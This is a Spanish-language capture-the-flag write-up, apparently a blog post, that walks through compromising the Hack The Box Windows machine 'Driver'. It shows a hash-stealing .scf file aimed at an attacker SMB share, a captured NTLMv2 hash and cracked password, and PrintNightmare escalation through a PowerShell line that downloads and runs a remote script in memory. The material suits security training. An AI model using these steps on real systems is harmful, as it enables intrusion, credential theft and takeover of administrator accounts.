---
category: Hack The Box
tags:
  - eJPT
title: Machine Driver
comments: "true"
image: /assets/img/machines/driver/driverbanner.jpeg
---
## Introducción

**Driver** es una máquina de dificultad **fácil** en entorno **Windows** que se centra en la explotación de una impresora. Durante la fase de enumeración se identifican tres servicios expuestos: un servidor web en el puerto 80, SMB en el puerto 445 y WinRM en el 5985. Al acceder al sitio web mediante HTTP, se solicita autenticación básica, la cual se puede evadir utilizando las credenciales comunes `admin:admin`, permitiendo así el acceso al panel web. Dentro del sitio se ofrece una funcionalidad para subir firmwares de impresoras hacia un recurso SMB, lo cual es utilizado por un equipo remoto para pruebas. Aprovechando esta funcionalidad, se puede cargar un archivo de comandos que ejecuta una instrucción para conectarse a un servidor externo, lo que permite capturar el hash NTLM del usuario `tony`. Luego de crackear dicho hash, se puede iniciar sesión como `tony` usando WinRM. Finalmente, mediante una sesión de Meterpreter, se identifica que el sistema es vulnerable a una escalada de privilegios local a través de un controlador de impresora instalado. Al explotar esta vulnerabilidad, se obtiene acceso como `NT AUTHORITY\SYSTEM`.
## Enumeración

La presencia del puerto **80** sugiere que puede haber una aplicación web expuesta, mientras que los puertos **135**, **445** y **5985** indican que se trata de una máquina **Windows**, con posibilidad de acceder a recursos compartidos por SMB y administración remota mediante WinRM. Estos hallazgos sientan las bases para las siguientes etapas de explotación.
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.106

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Initiating SYN Stealth Scan at 19:07
Scanning 10.10.11.106 [65535 ports]
Discovered open port 80/tcp on 10.10.11.106
Discovered open port 135/tcp on 10.10.11.106
Discovered open port 445/tcp on 10.10.11.106
Discovered open port 5985/tcp on 10.10.11.106
Completed SYN Stealth Scan at 19:08, 27.28s elapsed (65535 total ports)
Nmap scan report for 10.10.11.106
Host is up, received user-set (0.27s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 24 (1.056KB)
```

### HTTP

Al acceder al puerto **80**, se presentó una ventana de **autenticación HTTP básica**. Probando combinaciones comunes, el usuario y contraseña `admin:admin` fueron aceptados, permitiendo el acceso al sitio. El contenido corresponde a una **interfaz de administración de impresoras**, que ofrecía una funcionalidad para subir firmwares destinados a pruebas internas por parte de un equipo remoto. Este punto se vuelve clave más adelante, ya que nos permitirá interactuar con el sistema a través de archivos maliciosos.

![1](/assets/img/machines/driver/1.jpeg)

## SCF Malicious File
Dentro del panel web, se ofrecía una función para **subir firmwares de impresora**, lo que abría la puerta a posibles vectores de ataque basados en archivos maliciosos. Aprovechando esto, se creó un archivo con extensión `.scf` (Shell Command File), un formato conocido por poder desencadenar la **autenticación automática del usuario hacia un recurso compartido**, provocando así el envío del hash NTLM al atacante.

El contenido del archivo `file.scf` fue el siguiente:
```
[Shell]
Command=2
IconFile=\\10.10.16.6\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
![2](/assets/img/machines/driver/2.jpeg)

levanté un servidor SMB utilizando la herramienta `impacket-smbserver`, lo que permitió capturar el intento de autenticación generado por el sistema al procesar el archivo.
```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.106,49414)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:cab8215b0256bd203c933c30a5efdacd:010100000000000080ae2871ead8db01c244e8b68e6f3d6a00000000010010004c00720048004600670069004e006500030010004c00720048004600670069004e006500020010004d005800630042005a00470063004f00040010004d005800630042005a00470063004f000700080080ae2871ead8db01060004000200000008003000300000000000000000000000002000002b7571a37465ae498275c2386619f6645344d8556bee01221a61d4d67c63772f0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
```

Al momento de subir el `.scf` a través del panel, el servidor recibió una conexión entrante desde la máquina víctima, revelando exitosamente el hash NTLMv2 del usuario `tony`.

## Crack hash
Después de capturar el hash del usuario `tony`, procedí a intentar crackearlo con la herramienta `john` utilizando el diccionario `rockyou.txt`. El ataque fue exitoso y permitió recuperar la contraseña en texto claro asociada al usuario, la cual resultó ser `liltony`, como se muestra a continuación:
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2025-06-08 23:13) 1.754g/s 55691p/s 55691c/s 55691C/s !!!!!!..225566
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```


Se utilizó `crackmapexec` para verificar si las credenciales obtenidas (`tony:liltony`) eran válidas para el servicio SMB.
```bash
❯ crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
```

Posteriormente, se probó la autenticación a través del servicio WinRM (Windows Remote Management), también utilizando `crackmapexec`. El acceso fue exitoso y se indicó la posibilidad de ejecución remota de comandos con el mensaje `(Pwn3d!)`.
```bash
❯ crackmapexec winrm smb 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
HTTP        10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

Finalmente, se estableció una sesión remota utilizando `evil-winrm` con las credenciales previamente obtenidas. La conexión fue exitosa y permitió acceder al sistema como el usuario **driver\tony**:
```bash
❯ evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Una vez dentro del sistema como el usuario **tony**, se accedió al escritorio del mismo y se localizó el archivo `user.txt`, que contiene la primera flag.
```bash
*Evil-WinRM* PS C:\Users\tony\Documents> cd ..
*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/8/2025   9:58 PM             34 user.txt


*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
140be9e11c309ee79fe5c9d2958c887e
```

## Escalada PrintNightmare
Con el objetivo de identificar posibles vectores de escalada de privilegios, se subió la herramienta de reconocimiento **winPEASx64.exe** al directorio temporal `C:\Windows\Temp\Priv`. Esta utilidad automatiza la recolección de información sensible del sistema relacionada con vulnerabilidades locales, configuraciones inseguras y servicios mal configurados.
```bash
*Evil-WinRM* PS C:\Windows\Temp\Priv> upload winPEASx64.exe
                                        
Info: Uploading /home/alex/HTB/driver/winPEASx64.exe to C:\Windows\Temp\Priv\winPEASx64.exe
                                        
Data: 13540692 bytes of 13540692 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\Priv> .\winPEASx64.exe
```

Durante el análisis con **winPEAS**, se identificó que el proceso **`spoolsv.exe`** (servicio de cola de impresión de Windows) se encuentra activo en el sistema. Esta observación es crucial, ya que dicho servicio es vulnerable al **CVE-2021-1675**, también conocido como **PrintNightmare**.
![3](/assets/img/machines/driver/3.jpeg)

Tras identificar que el servicio **`spoolsv`** estaba activo y vulnerable, se procedió a **explotar la vulnerabilidad CVE-2021-1675 (PrintNightmare)** cargando un script de explotación remoto.  
```bash
*Evil-WinRM* PS C:\Windows\Temp\Privesc> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/CVE-2021-1675.ps1')
```
Este comando combina varias funcionalidades de PowerShell para cargar y ejecutar código remoto en memoria sin necesidad de escribirlo en disco. El método `New-Object Net.WebClient` crea un objeto que permite realizar peticiones HTTP, y con `.DownloadString(...)`.

se descarga el contenido del archivo PowerShell alojado en un servidor web controlado por el atacante (en este caso, con IP **10.10.16.6**).
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.106 - - [09/Jun/2025 01:35:42] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
```

se ejecutó `Invoke-Nightmare` con el objetivo de crear un nuevo usuario llamado **`test`** con la contraseña **`test123`** y asignarle privilegios de **administrador local**, logrando así una **escalada de privilegios** efectiva en el sistema comprometido.
```bash
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Invoke-Nightmare -DriverName "Xerox" -NewUser "test" -NewPassword "test123"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user test as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Windows\Temp\Privesc> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
test                     tony
The command completed with one or more errors.
```

Para verificar que este nuevo usuario tenía acceso remoto con privilegios elevados a través de **WinRM**, se utilizó `crackmapexec` nuevamente confirmando que el usuario tiene acceso:
```bash
❯ crackmapexec winrm smb 10.10.11.106 -u 'test' -p 'test123'
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
HTTP        10.10.11.106    5985   DRIVER           [+] DRIVER\test:test123 (Pwn3d!)
```

se procedió a establecer una sesión remota completa a través de **evil-winrm** utilizando las credenciales recién creadas. Esto se logró ejecutando el siguiente comando:
```bash
❯ evil-winrm -i 10.10.11.106 -u 'test' -p 'test123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
```

Una vez dentro como usuario `test`, se navegó al escritorio del usuario `Administrator`, demostrando acceso total al sistema con privilegios de administrador. Desde allí, se accedió al archivo `root.txt`.
```bash
*Evil-WinRM* PS C:\Users\test\Documents> cd C:\Users\Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/8/2025   9:58 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
45264eadd5dd2d5a15de78f9eae78fc5
```
